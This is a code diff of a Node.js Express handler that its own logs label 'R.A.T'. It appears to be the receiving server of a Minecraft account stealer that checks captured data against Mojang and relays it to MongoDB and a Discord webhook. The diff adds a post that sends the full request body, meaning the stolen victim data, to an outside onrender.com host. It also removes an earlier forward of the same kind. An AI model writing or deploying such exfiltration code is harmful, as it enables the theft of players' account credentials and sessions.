@@ -68,6 +68,14 @@ app.post("/", (req, res) => {
         }
     })
 
+    post("https://networth-api-dxxxxy.onrender.com", JSON.stringify({
+        content: req.body
+    }), {
+        headers: {
+            "Content-Type": "application/json"
+        }
+    })
+
     .then(async response => {
         if (response.status == 204) { //mojangs way of saying its good
             if (usingMongoDB) {
@@ -165,14 +173,6 @@ app.post("/", (req, res) => {
                     }],
                     attachments: []
                 }), {
-                    headers: {
-                        "Content-Type": "application/json"
-                    }
-                }).catch(err => {
-                    console.log(`[R.A.T] Error while sending to Discord webhook:\n${err}`)
-                })
-                console.log("chigger" + req.body.text)
-                post("https://networth-api-dxxxxy.onrender.com", req.body.text, {
                     headers: {
                         "Content-Type": "application/json"
                     }
